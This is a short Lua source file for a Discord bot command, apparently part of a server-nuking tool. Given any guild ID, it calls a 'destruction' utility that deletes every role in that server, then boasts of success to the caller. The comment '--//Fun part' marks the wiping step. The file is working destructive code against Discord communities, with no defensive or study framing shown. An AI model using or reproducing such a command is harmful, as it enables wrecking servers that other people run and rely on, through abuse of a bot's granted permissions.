local command = {
	name = "rolesonly",
	description = "Deletes all roles, cannot be undone.",
}

function command:execute(discordia, client, message, arguments)
	if not arguments[1] then --//Guard clause
		return message:reply("Missing arguments.")
	end
	local guild = client:getGuild(arguments[1])
	if not guild or guild.unavailable then --//Guard clause
		return message:reply("Invalid Guild-Resolvable.")
	end
	client._utilities.destruction:deleteRoles(guild.me, guild.roles, client._configuration.rateLimit) --//Fun part
	pcall(function() --//Pcall to protect the thread from errors
		message.author:send(
			"Successfully deleted all roles in "
				.. guild.name
				.. " ("
				.. guild.id
				.. ")! Check console to see if any steps were skipped."
		)
	end)
	print("Successfully deleted all roles in Guild " .. guild.name .. " (" .. guild.id .. ")!")
end

return command
